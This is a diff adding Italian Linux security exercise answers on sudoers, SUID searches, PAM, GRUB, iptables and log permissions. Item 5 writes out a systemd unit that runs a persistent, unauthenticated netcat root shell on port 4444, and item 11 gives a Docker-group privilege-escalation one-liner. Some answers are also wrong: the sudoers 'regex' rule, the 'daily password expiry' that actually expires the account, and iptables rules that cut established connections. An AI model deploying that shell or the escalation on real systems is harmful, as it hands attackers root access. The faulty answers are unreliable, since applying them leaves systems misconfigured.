@@ -1,0 +1,162 @@
+1. Configura sudo affinché un utente possa eseguire solo un comando specifico (es: nmap)
+
+Modifica il file /etc/sudoers usando visudo:
+sudo visudo
+
+Aggiungi una riga come questa:
+username ALL=(ALL) NOPASSWD: /usr/bin/nmap
+Sostituisci username con l'utente desiderato.
+
+Ora, l'utente può eseguire solo:
+sudo nmap
+
+
+2. Configura sudo affinché un utente possa eseguire un comando senza un parametro (es: nmap ma non nmap -p)
+
+Usa le espressioni regolari nel file sudoers. Modifica con visudo:
+sudo visudo
+
+Aggiungi questa riga:
+username ALL=(ALL) NOPASSWD: /usr/bin/nmap [^-\].*
+
+In questa configurazione:
+L'utente può eseguire sudo nmap ma non sudo nmap -p.
+
+
+3. Cercare tutti gli eseguibili con SUID
+
+Esegui:
+find / -perm -4000 -type f 
+
+
+4. Cercare tutti gli eseguibili con GUID
+Esegui:
+
+bash
+find / -perm -2000 -type f 2>/dev/null
+
+
+5. Creare uno unit file di Systemd per permettere una shell aperta a tutti sulla rete
+
+Crea il file /etc/systemd/system/nc-shell.service:
+sudo nano /etc/systemd/system/nc-shell.service
+
+Aggiungi il seguente contenuto:
+[Unit]
+Description=Netcat Shell
+After=network.target
+
+[Service]
+ExecStart=/bin/nc -lvp 4444 -e /bin/bash
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+
+Rendi il servizio persistente:
+sudo systemctl daemon-reload
+sudo systemctl enable nc-shell
+sudo systemctl start nc-shell
+
+Connettiti alla shell da un'altra macchina:
+nc <server_ip> 4444
+
+
+6. Installare e configurare un modulo PAM per richiedere caratteristiche minime alla password
+
+Installa il modulo PAM per la qualità della password:
+sudo apt install libpam-pwquality
+
+Configura /etc/security/pwquality.conf:
+minlen = 8
+minclass = 3
+
+Aggiorna /etc/pam.d/common-password:
+password requisite pam_pwquality.so retry=3
+
+
+7. Imposta una password a GRUB
+
+Genera una password criptata:
+grub-mkpasswd-pbkdf2
+
+Modifica /etc/grub.d/40_custom:
+set superusers="root"
+password_pbkdf2 root <hashed_password>
+
+Aggiorna GRUB:
+sudo update-grub
+
+
+8. Rendi /var/log leggibile solo da root
+
+Esegui:
+sudo chmod -R 700 /var/log
+
+
+9. Configura un utente per leggere i log con cat
+
+Modifica sudoers:
+username ALL=(ALL) NOPASSWD: /bin/cat /var/log/*
+
+
+10. Trova processi con file descriptor aperti in /var/log
+
+Esegui:
+sudo lsof +D /var/log
+
+
+11. Usa Docker per effettuare privilege escalation
+
+Se un utente appartiene al gruppo Docker, può accedere come root:
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+
+12. Cerca file nella home scrivibili da tutti
+
+Esegui:
+find /home -type f -perm -o+w 2>/dev/null
+
+
+13. Cerca cartelle nella home scrivibili da tutti
+
+Esegui:
+find /home -type d -perm -o+w 2>/dev/null
+
+
+14. Crea un utente con password che scade ogni giorno
+
+Crea un utente:
+sudo useradd -m -s /bin/bash -e $(date -d "1 day" +%Y-%m-%d) username
+
+Imposta una password:
+sudo passwd username
+
+
+15. Configura Iptables per permettere solo SSH
+
+Esegui:
+sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+sudo iptables -A INPUT -j DROP
+
+
+16. Configura Iptables per SSH da IP specifico e webserver
+
+Esegui:
+sudo iptables -A INPUT -p tcp --dport 22 -s 1.2.3.4 -j ACCEPT
+sudo iptables -A INPUT -p tcp -m multiport --dports 80,443 -j ACCEPT
+sudo iptables -A INPUT -j DROP
+
+
+17. Configura Iptables per bloccare tutto tranne il webserver
+
+Esegui:
+sudo iptables -A INPUT -p tcp -m multiport --dports 80,443 -j ACCEPT
+sudo iptables -A INPUT -j DROP
+
+
+18. Configura Iptables per SSH e webserver
+
+Esegui:
+sudo iptables -A INPUT -p tcp -m multiport --dports 22,80,443 -j ACCEPT
+sudo iptables -A INPUT -j DROP
